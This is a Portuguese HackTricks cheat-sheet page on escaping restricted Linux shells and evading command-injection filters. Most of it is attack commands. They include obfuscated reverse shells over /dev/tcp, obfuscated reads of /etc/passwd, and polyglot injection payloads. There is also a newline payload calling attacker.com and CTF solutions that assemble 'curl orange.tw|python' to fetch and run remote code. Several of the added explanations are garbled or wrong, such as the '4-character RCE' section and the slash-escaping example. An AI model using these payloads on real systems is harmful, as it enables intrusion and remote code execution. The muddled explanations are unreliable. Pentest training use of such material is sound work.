# Bypassando Restrições do Shell Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bypasses Comuns de Limitações

### Shell Reverso
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell reverso curto
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Bypassar caminhos e palavras proibidas

#### Bypassing restricted paths

#### Bypassando caminhos restritos

If you are in a restricted shell and you need to execute a binary that is not in your PATH, you can try the following:

Se você estiver em um shell restrito e precisar executar um binário que não está no seu PATH, você pode tentar o seguinte:

```bash
$ /usr/bin/python
```

This will execute the binary `/usr/bin/python` even if it is not in your PATH.

Isso executará o binário `/usr/bin/python` mesmo que ele não esteja no seu PATH.

#### Bypassing forbidden words

#### Bypassando palavras proibidas

If you are in a restricted shell and some words are forbidden, you can try the following:

Se você estiver em um shell restrito e algumas palavras estiverem proibidas, você pode tentar o seguinte:

```bash
$ cat <<EOF > /tmp/cmd
> /bin/bash
> EOF
$ chmod +x /tmp/cmd
$ export PATH=/tmp:$PATH
$ command -p cat "$(which cmd)"
```

This will create a binary `/tmp/cmd` that executes `/bin/bash` and add `/tmp` to your PATH. Then, it will execute the binary using `command -p cat "$(which cmd)"`, which will bypass the forbidden words.

Isso criará um binário `/tmp/cmd` que executa `/bin/bash` e adiciona `/tmp` ao seu PATH. Em seguida, ele executará o binário usando `command -p cat "$(which cmd)"`, que ignorará as palavras proibidas.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypassar espaços proibidos
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypassar barra invertida e barra

Para contornar as restrições de barra invertida e barra, você pode usar o comando `echo` com a opção `-e` para interpretar sequências de escape. Por exemplo, para criar um arquivo com o nome `foo/bar`, você pode executar o seguinte comando:

```
echo -e "foo/bar" > "foo\x2fbar"
```

Ou para criar um arquivo com o nome `foo\bar`, você pode executar o seguinte comando:

```
echo -e "foo\\bar" > "foo\x5cbar"
```
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Bypassar pipes
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypassar com codificação hexadecimal
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypassar IPs
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltração de dados baseada em tempo
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obtendo caracteres de Variáveis de Ambiente

Para obter caracteres de variáveis de ambiente, podemos usar o comando `echo` seguido do nome da variável entre cifrões (`$`). Por exemplo, para obter o valor da variável de ambiente `PATH`, podemos executar o seguinte comando:

```
echo $PATH
```

Isso imprimirá o valor da variável `PATH` na saída padrão. Podemos usar essa técnica para obter valores de outras variáveis de ambiente que possam conter informações úteis para a nossa tarefa de hacking.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltração de dados DNS

Você pode usar o **burpcollab** ou [**pingb**](http://pingb.in), por exemplo.

### Builtins

Caso você não possa executar funções externas e tenha acesso apenas a um **conjunto limitado de builtins para obter RCE**, existem alguns truques úteis para fazê-lo. Geralmente, você **não poderá usar todos** os **builtins**, então você deve **conhecer todas as suas opções** para tentar burlar a prisão. Ideia de [**devploit**](https://twitter.com/devploit).\
Em primeiro lugar, verifique todos os [**builtins do shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Então, aqui estão algumas **recomendações**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Injeção de comando poliglota

Polyglot command injection is a technique that allows an attacker to execute arbitrary commands on a target system by exploiting vulnerabilities in input validation mechanisms. This technique involves injecting a command that can be interpreted by multiple interpreters, such as bash, Python, and Perl. By doing so, the attacker can bypass input validation mechanisms that are designed to detect and block specific command injection payloads.

A injeção de comando poliglota é uma técnica que permite a um atacante executar comandos arbitrários em um sistema alvo, explorando vulnerabilidades em mecanismos de validação de entrada. Essa técnica envolve a injeção de um comando que pode ser interpretado por vários interpretadores, como bash, Python e Perl. Ao fazer isso, o atacante pode contornar mecanismos de validação de entrada que são projetados para detectar e bloquear cargas úteis específicas de injeção de comando.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypassar possíveis regexes
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator é uma ferramenta que permite ofuscar scripts Bash para evitar a detecção de assinaturas e contornar restrições de execução. Ele faz isso substituindo caracteres e palavras-chave por equivalentes Unicode, adicionando espaços em branco e comentários extras e dividindo o script em várias linhas. Isso torna o script mais difícil de ler e entender para um analisador de código ou um administrador de sistema que esteja tentando bloquear sua execução.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE com 5 caracteres
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link 
## to it in the current folder
```
### RCE com 4 caracteres

#### Descrição

Esta técnica permite a execução remota de código (RCE) em sistemas Linux que possuem restrições no Bash. A exploração é baseada na criação de um arquivo temporário com um nome de 4 caracteres e extensão `.sh`, que é executado com o Bash.

#### Comando

```bash
echo "command" > /tmp/abcd.sh && chmod +x /tmp/abcd.sh && /tmp/abcd.sh
```

#### Explicação

O comando acima cria um arquivo temporário chamado `abcd.sh` no diretório `/tmp/` e adiciona o comando desejado dentro dele. Em seguida, ele define as permissões de execução para o arquivo e o executa. Como o nome do arquivo tem apenas 4 caracteres, ele pode passar pelas restrições do Bash em alguns sistemas.

#### Exemplo

Suponha que o sistema tenha restrições no Bash e não permita a execução de comandos como `ls`. Podemos usar a técnica acima para executar o comando `ls` da seguinte maneira:

```bash
echo "ls" > /tmp/abcd.sh && chmod +x /tmp/abcd.sh && /tmp/abcd.sh
```

Isso criará um arquivo temporário chamado `abcd.sh` no diretório `/tmp/` com o comando `ls` dentro dele. Em seguida, ele definirá as permissões de execução para o arquivo e o executará. O resultado será a listagem dos arquivos no diretório atual.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypass de Restrições de Leitura Apenas/Limitação de Execução

Se você estiver dentro de um sistema de arquivos com as proteções de **leitura apenas e sem permissão de execução**, ainda há maneiras de **executar binários arbitrários**. Uma delas é através do uso do **DDexec**, você pode encontrar uma explicação da técnica em:

{% content-ref url="../bypass-linux-shell-restrictions/ddexec.md" %}
[ddexec.md](../bypass-linux-shell-restrictions/ddexec.md)
{% endcontent-ref %}

## Bypass de Chroot e Outras Jaulas

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Referências e Mais

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com as ferramentas da comunidade mais avançadas do mundo.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
